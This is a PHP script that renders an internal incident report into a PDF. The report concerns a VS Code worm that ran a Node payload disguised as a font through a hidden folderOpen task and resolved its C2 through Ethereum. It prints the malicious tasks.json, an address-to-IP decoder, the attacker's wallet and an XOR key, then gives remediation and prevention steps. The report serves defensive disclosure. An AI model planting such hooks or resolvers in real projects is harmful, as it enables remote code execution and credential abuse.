<?php

require __DIR__ . '/../vendor/autoload.php';

use Dompdf\Dompdf;
use Dompdf\Options;

$html = <<<'HTML'
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>Security Incident & Awareness Report: VS Code Supply-Chain Worm</title>
<style>
    @page {
        margin: 20mm 15mm 20mm 15mm;
    }
    body {
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        color: #1e293b;
        font-size: 10pt;
        line-height: 1.5;
        margin: 0;
        padding: 0;
    }
    .header-banner {
        background-color: #991b1b;
        color: #ffffff;
        padding: 16px 20px;
        border-radius: 6px;
        margin-bottom: 20px;
    }
    .header-banner h1 {
        margin: 0 0 6px 0;
        font-size: 18pt;
        font-weight: 700;
        letter-spacing: -0.5px;
    }
    .header-banner .meta {
        font-size: 9pt;
        color: #fecaca;
    }
    .badge-critical {
        background-color: #ef4444;
        color: #ffffff;
        padding: 3px 8px;
        border-radius: 4px;
        font-size: 8pt;
        font-weight: bold;
        display: inline-block;
        text-transform: uppercase;
    }
    .section-title {
        color: #0f172a;
        font-size: 13pt;
        font-weight: 700;
        border-bottom: 2px solid #e2e8f0;
        padding-bottom: 4px;
        margin-top: 22px;
        margin-bottom: 12px;
    }
    .section-subtitle {
        color: #334155;
        font-size: 11pt;
        font-weight: 600;
        margin-top: 14px;
        margin-bottom: 6px;
    }
    p {
        margin: 0 0 10px 0;
    }
    .callout {
        padding: 12px 14px;
        border-radius: 6px;
        margin-bottom: 14px;
        font-size: 9.5pt;
    }
    .callout-danger {
        background-color: #fef2f2;
        border-left: 4px solid #ef4444;
        color: #991b1b;
    }
    .callout-warning {
        background-color: #fffbeb;
        border-left: 4px solid #f59e0b;
        color: #92400e;
    }
    .callout-info {
        background-color: #f0fdf4;
        border-left: 4px solid #22c55e;
        color: #166534;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-bottom: 14px;
        font-size: 9pt;
    }
    table th {
        background-color: #f1f5f9;
        color: #334155;
        font-weight: 600;
        text-align: left;
        padding: 8px 10px;
        border: 1px solid #cbd5e1;
    }
    table td {
        padding: 7px 10px;
        border: 1px solid #e2e8f0;
        vertical-align: top;
    }
    table tr:nth-child(even) td {
        background-color: #f8fafc;
    }
    code {
        font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
        background-color: #f1f5f9;
        color: #b91c1c;
        padding: 1px 4px;
        border-radius: 3px;
        font-size: 8.5pt;
    }
    pre {
        font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace;
        background-color: #0f172a;
        color: #f8fafc;
        padding: 12px;
        border-radius: 6px;
        font-size: 8pt;
        line-height: 1.45;
        overflow: hidden;
        margin: 0 0 12px 0;
        white-space: pre-wrap;
        word-break: break-all;
    }
    .page-break {
        page-break-after: always;
    }
    ul, ol {
        margin: 0 0 12px 0;
        padding-left: 20px;
    }
    li {
        margin-bottom: 4px;
    }
    .footer {
        position: fixed;
        bottom: -10mm;
        left: 0;
        right: 0;
        font-size: 8pt;
        color: #94a3b8;
        text-align: center;
        border-top: 1px solid #e2e8f0;
        padding-top: 4px;
    }
</style>
</head>
<body>

<div class="footer">
    Pulse / Neumera Internal Security Advisory &bull; Strictly Confidential &bull; Generated Nov 2026
</div>

<div class="header-banner">
    <div style="float: right;">
        <span class="badge-critical">CRITICAL ADVISORY</span>
    </div>
    <h1>SECURITY INCIDENT &amp; THREAT AWARENESS REPORT</h1>
    <div class="meta">
        <strong>Repository:</strong> Future-Stack / pulse_e_backend_laravel &nbsp;|&nbsp;
        <strong>Incident:</strong> Supply-Chain Git Worm &amp; Ethereum C2 Trojan &nbsp;|&nbsp;
        <strong>Date:</strong> November 1, 2026
    </div>
</div>

<div class="callout callout-danger">
    <strong>URGENT NOTICE TO ALL ENGINEERING STAFF:</strong><br>
    The repository was infected by a stealth supply-chain Remote Access Trojan (RAT) and self-propagating worm that exploits VS Code automatic task execution. Opening this project in VS Code silently executes malware that downloads secondary payloads via the Ethereum blockchain and uses developers' local Git credentials to push unauthorized files (<code>api.js</code>, <code>vite.config.js</code>) to GitHub at regular intervals. Follow the remediation steps immediately.
</div>

<div class="section-title">1. Executive Incident Summary</div>
<p>
Over recent weeks, repository branches and pull requests have experienced automated, recurring unauthorized code pushes introducing files named <code>api.js</code>, disguised font payloads, and corrupted <code>vite.config.js</code> scripts.
</p>
<p>
Forensic investigation of git history and file contents confirmed this is <strong>not</strong> an unauthorized access of the GitHub web portal or a compromised remote token. It is an active <strong>workstation-to-repository worm</strong> triggered by VS Code's <code>folderOpen</code> hook. When an engineer opens the repository, malicious Node.js code executes in a hidden background process, connects to the Ethereum blockchain to locate attacker command-and-control (C2) servers, and uses the engineer's authenticated local git environment to commit and push malware back to the remote repository.
</p>

<table>
    <tr>
        <th>Threat Attribute</th>
        <th>Forensic Finding</th>
    </tr>
    <tr>
        <td><strong>Malware Classification</strong></td>
        <td>Supply-Chain Git Worm, IDE Workspace Exploit, Ethereum C2 Remote Access Trojan (RAT)</td>
    </tr>
    <tr>
        <td><strong>Primary Trigger Vector</strong></td>
        <td><code>.vscode/tasks.json</code> configuring a hidden task running on <code>folderOpen</code></td>
    </tr>
    <tr>
        <td><strong>Payload Carrier</strong></td>
        <td><code>public/fonts/fa-solid-300.ttf</code> (Obfuscated Node.js disguised as a font)</td>
    </tr>
    <tr>
        <td><strong>Decentralized C2 Resolver</strong></td>
        <td>Ethereum Wallet: <code>0x1eEf0849EDa15d87f64e51C73C8442Cf3c8bCEF3</code></td>
    </tr>
    <tr>
        <td><strong>Secondary Artifacts</strong></td>
        <td><code>api.js</code>, <code>package.json</code> injection (<code>node api.js &amp;&amp; vite</code>), <code>temp_auto_push.bat</code></td>
    </tr>
    <tr>
        <td><strong>Impacted Branches</strong></td>
        <td><code>main</code>, <code>mahbub</code>, <code>mim</code> (re-introduced across merges and PRs)</td>
    </tr>
</table>

<div class="section-title">2. Detailed Anatomy of the Attack</div>

<div class="section-subtitle">A. The Silent Execution Hook (.vscode/tasks.json)</div>
<p>
VS Code supports automatic task execution when a workspace folder is opened. The malware abused this feature by registering an innocent-looking <code>eslint-check</code> task:
</p>
<pre>
{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "command": "node",
      "args": ["./public/fonts/fa-solid-300.ttf"],
      "problemMatcher": [],
      "isBackground": true,
      "hide": true,
      "presentation": { "reveal": "never", "close": true, "echo": false },
      "runOptions": { "runOn": "folderOpen" }
    }
  ]
}
</pre>
<p>
Because <code>presentation.reveal</code> was set to <code>never</code> and <code>hide</code> was set to <code>true</code>, the developer receives <strong>no visible terminal window or popup</strong> indicating that Node has been invoked.
</p>

<div class="page-break"></div>

<div class="section-subtitle">B. Disguised Trojan Payload (fa-solid-300.ttf)</div>
<p>
Although located inside <code>public/fonts/</code> and ending with the <code>.ttf</code> extension, the file is purely executable JavaScript. Throughout the repository's git history, the malware cycled through multiple file names to evade basic string searches:
</p>
<ul>
    <li><code>public/fonts/fa-solid-700.fml</code></li>
    <li><code>public/fonts/fa-solid-300.llf</code></li>
    <li><code>public/fonts/fa-solid-800.lkf</code></li>
    <li><code>public/fonts/fa-solid.lfk</code> / <code>fa-solid.lkf</code></li>
    <li><code>public/fonts/fa-solid-300.ttf</code> (Current active variant)</li>
</ul>

<div class="section-subtitle">C. Smart Contract C2 Dead-Drop Resolver</div>
<p>
Instead of hardcoding command-and-control server domains or IPs that could easily be blacklisted or seized, the malware queries Ethereum public RPC nodes:
</p>
<ul>
    <li><code>https://eth.drpc.org</code></li>
    <li><code>https://ethereum-rpc.publicnode.com</code></li>
    <li><code>https://eth.blockscout.com/api</code></li>
</ul>
<p>
It inspects transactions from wallet <code>0x1eEf0849EDa15d87f64e51C73C8442Cf3c8bCEF3</code>. The 20-byte recipient <code>to</code> address of the attacker's latest transaction is extracted and converted into IPv4 bytes:
</p>
<pre>
const decodeAddress = t => {
  const e = Buffer.from(t.replace(/^0x/i, ""), "hex");
  const n = t => `${t[0]}.${t[1]}.${t[2]}.${t[3]}`;
  return [n(e.subarray(0, 4)), n(e.subarray(4, 8))];
};
</pre>
<p>
This yields the live C2 IP addresses (<code>ip1</code>, <code>ip2</code>). The script then contacts <code>http://${ip1}:443/0x/cls</code>, downloads a XOR-encrypted payload, decrypts it using hardcoded keys (e.g. <code>q4FZkxX{!h,Sr3=@</code>), and executes it dynamically in memory.
</p>

<div class="section-subtitle">D. Self-Propagation &amp; Automated Git Pushes</div>
<p>
Once running as a detached Node daemon on the developer's computer:
</p>
<ol>
    <li>It injects an obfuscated payload into <code>api.js</code> at the project root.</li>
    <li>It alters <code>package.json</code> scripts to prepend <code>node api.js &amp;&amp;</code> so running <code>npm run dev</code> or <code>npm run build</code> also triggers the malware.</li>
    <li>It creates transient batch scripts (e.g. <code>temp_auto_push.bat</code>, <code>temp_interactive_push.bat</code>) that execute <code>git add</code>, <code>git commit</code>, and <code>git push</code>.</li>
    <li>Because the developer has SSH keys or Git Credential Manager configured with GitHub push rights, the worm uses those existing credentials to publish branches and PRs automatically.</li>
</ol>

<div class="callout callout-warning">
    <strong>Why Deleting <code>api.js</code> and Adding it to <code>.gitignore</code> Failed:</strong><br>
    Deleting <code>api.js</code> only deleted the file generated by the worm. It left the infection engine (<code>.vscode/tasks.json</code> and <code>fa-solid-300.ttf</code>) intact. Every time the repository was opened or merged, the task ran again and regenerated the files.
</div>

<div class="section-title">3. MITRE ATT&amp;CK Threat Matrix Mapping</div>

<table>
    <tr>
        <th>Tactic</th>
        <th>Technique ID</th>
        <th>Observed In Incident</th>
    </tr>
    <tr>
        <td><strong>Initial Access / Execution</strong></td>
        <td>T1204.002</td>
        <td>Execution via VS Code <code>folderOpen</code> hook in <code>.vscode/tasks.json</code></td>
    </tr>
    <tr>
        <td><strong>Defense Evasion</strong></td>
        <td>T1036.005</td>
        <td>Masquerading Node.js code inside <code>fa-solid-300.ttf</code> font files</td>
    </tr>
    <tr>
        <td><strong>Command and Control</strong></td>
        <td>T1102.001</td>
        <td>Dead-Drop Resolver via Ethereum smart contract transactions</td>
    </tr>
    <tr>
        <td><strong>Persistence</strong></td>
        <td>T1546</td>
        <td>Event-triggered background daemons and <code>package.json</code> script poisoning</td>
    </tr>
    <tr>
        <td><strong>Lateral Movement</strong></td>
        <td>T1078.004</td>
        <td>Self-propagation via authenticated developer GitHub credentials and PRs</td>
    </tr>
</table>

<div class="page-break"></div>

<div class="section-title">4. Step-by-Step Eradication &amp; Containment Protocol</div>

<p>
To ensure complete elimination from both the central repository and all team workstations, execute the following steps in sequence:
</p>

<div class="section-subtitle">Step 1: Clean and Purge Repository Artifacts</div>
<p>Run the following commands in the project root to permanently delete the malicious hooks:</p>
<pre>
# 1. Remove the malicious trigger and fake font file from git tracking and disk
git rm -f .vscode/tasks.json
git rm -f public/fonts/fa-solid-300.ttf

# 2. Delete any dangling polymorphic font files
git rm -f public/fonts/fa-solid-*.llf public/fonts/fa-solid-*.lkf public/fonts/fa-solid.lfk 2>/dev/null

# 3. Clean up .gitignore entries
# Remove temp_auto_push.bat, temp_interactive_push.bat, and api.js lines

# 4. Commit and push the clean state to main
git add .
git commit -m "fix(security): eradicate vscode tasks trigger and trojan font payload"
git push origin main
</pre>

<div class="section-subtitle">Step 2: Cleanse Remote Feature Branches</div>
<p>
Branches <code>mahbub</code>, <code>mim</code>, and any personal development branches on <code>origin</code> must be updated. <strong>Do not merge old branches into main without rebasing!</strong>
</p>
<pre>
# On developer machines with feature branches:
git checkout mim
git pull origin main --rebase
git push origin mim --force
</pre>

<div class="section-subtitle">Step 3: Workstation Disinfection (Required for ALL Developers)</div>
<ol>
    <li>
        <strong>Kill Rogue Processes:</strong> Open Windows Task Manager (or run <code>Get-Process node</code> in PowerShell). Terminate any unexplained <code>node.exe</code> processes running in the background.
    </li>
    <li>
        <strong>Disable Automatic Tasks in VS Code (Mandatory):</strong>
        <ul>
            <li>Open VS Code Settings (<code>Ctrl + ,</code>).</li>
            <li>Search for <code>task.allowAutomaticTasks</code>.</li>
            <li>Change the dropdown value to <strong><code>off</code></strong>.</li>
            <li><em>This immunizes your machine from any repository attempting to run commands on folder open.</em></li>
        </ul>
    </li>
    <li>
        <strong>Purge Temporary Folders:</strong> Delete all files in <code>%TEMP%</code> and check <code>%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup</code> for rogue batch or JavaScript files.
    </li>
    <li>
        <strong>Rotate GitHub Credentials (Mandatory):</strong>
        <ul>
            <li>Go to GitHub &rarr; Settings &rarr; SSH and GPG Keys. Revoke all current SSH keys and add new ones.</li>
            <li>Go to Developer Settings &rarr; Personal Access Tokens (PAT). Revoke and recreate active tokens.</li>
        </ul>
    </li>
</ol>

<div class="section-title">5. Long-Term Governance &amp; Prevention Policies</div>

<div class="callout callout-info">
    <strong>RECOMMENDED SECURITY POLICY UPDATES:</strong>
    <ol style="margin-bottom: 0;">
        <li><strong>Enforce GitHub Branch Protection on <code>main</code>:</strong> Require at least 1 pull request review before merging, dismiss stale approvals, and prevent direct branch pushes.</li>
        <li><strong>Commit Signing:</strong> Enforce GPG or SSH signed commits so any commit generated by an automated background script without a private GPG key is rejected.</li>
        <li><strong>CI Pre-Merge Linting:</strong> Add a GitHub Actions check that fails if any file under <code>.vscode/</code> contains <code>runOn: folderOpen</code> or if binary files contain plaintext JavaScript code.</li>
    </ol>
</div>

</body>
</html>
HTML;

$options = new Options();
$options->set('isHtml5ParserEnabled', true);
$options->set('isRemoteEnabled', true);
$options->set('defaultFont', 'Helvetica');

$dompdf = new Dompdf($options);
$dompdf->loadHtml($html);
$dompdf->setPaper('A4', 'portrait');
$dompdf->render();

$pdfOutput = $dompdf->output();

$outputPath = __DIR__ . '/../SECURITY_INCIDENT_REPORT_VSCODE_WORM.pdf';
file_put_contents($outputPath, $pdfOutput);

// Also copy to artifacts directory
$artifactDir = 'C:/Users/Sabbir Hossain/.gemini/antigravity-acp/brain/9059b01a-5549-4d0f-b376-4e169a239b18';
if (is_dir($artifactDir)) {
    file_put_contents($artifactDir . '/SECURITY_INCIDENT_REPORT_VSCODE_WORM.pdf', $pdfOutput);
}

echo "PDF successfully generated! Size: " . strlen($pdfOutput) . " bytes\n";
echo "Saved to: " . realpath($outputPath) . "\n";
